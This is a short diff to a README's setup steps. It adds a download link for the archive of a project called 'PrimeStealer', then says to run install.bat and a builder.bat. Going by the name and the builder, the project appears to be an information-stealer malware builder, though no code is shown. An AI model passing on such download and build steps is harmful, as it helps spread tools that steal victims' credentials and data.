@@ -71,7 +71,7 @@
 
 ### Setup
 
-1. Download File
+1. [Download File](https://github.com/SheLuvDx/PrimeStealer/archive/refs/heads/main.zip)
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
 4. Run the builder by double clicking the `builder.bat` file
